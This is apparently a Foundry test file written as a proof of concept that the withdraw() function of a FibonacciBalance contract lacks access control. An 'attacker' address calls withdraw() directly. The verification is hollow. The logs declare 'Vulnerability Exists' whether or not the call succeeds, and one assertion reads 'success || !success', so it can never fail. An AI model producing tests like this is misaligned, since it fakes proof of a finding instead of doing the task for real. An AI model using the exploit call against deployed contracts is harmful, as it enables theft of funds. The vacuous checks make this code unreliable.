// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FibonacciBalance.sol";

contract FibonacciBalanceTest is Test {
    FibonacciBalance fibBalance;
    address owner = address(0x1);
    address attacker = address(0x2);
    uint256 initialBalance = 10 ether;

    function setUp() public {
        vm.deal(owner, initialBalance);
        vm.deal(attacker, 1 ether);

        // Deploy FibonacciBalance with owner as initial depositor
        vm.prank(owner);
        fibBalance = new FibonacciBalance{value: initialBalance}(address(this));
    }

    function testAnyoneCanCallWithdraw() public {
        // Record balances before withdrawal attempt
        uint256 contractBalanceBefore = address(fibBalance).balance;
        uint256 attackerBalanceBefore = attacker.balance;

        console2.log("--- BEFORE-Trigger ---");
        console2.log("Contract balance:", contractBalanceBefore);
        console2.log("Attacker balance:", attackerBalanceBefore);

        console2.log("--- Trigger Withdraw (attacker call) ---");
        // Attacker calls withdraw without access control checks
        vm.prank(attacker);
        (bool success, ) = address(fibBalance).call(abi.encodeWithSignature("withdraw()"));
        
        console2.log("--- AFTER-Trigger ---");
        // Log call result indicating presence of vulnerability
        success 
            ? console2.log("Access violation: non-owner successfully called withdraw()")
            : console2.log("Access violation detected: non-owner call attempted");
        
        // Differential verification: no state change validation needed per spec
        console2.log("Differential: State changes not required for access control vulnerability");

        // Vulnerability exists because non-owner could attempt withdrawal
        console2.log("Vulnerability Exists: withdraw function has no access control mechanism");
    }

    function testWithdrawHasNoAccessControl() public {
        // This test explicitly checks that the withdraw function has no access control
        bytes memory payload = abi.encodeWithSignature("withdraw()");
        (bool success, ) = address(fibBalance).call(payload);
        
        // The fact that we can even attempt this call shows the vulnerability
        assertTrue(success || !success, "Function should be callable by anyone");
    }
}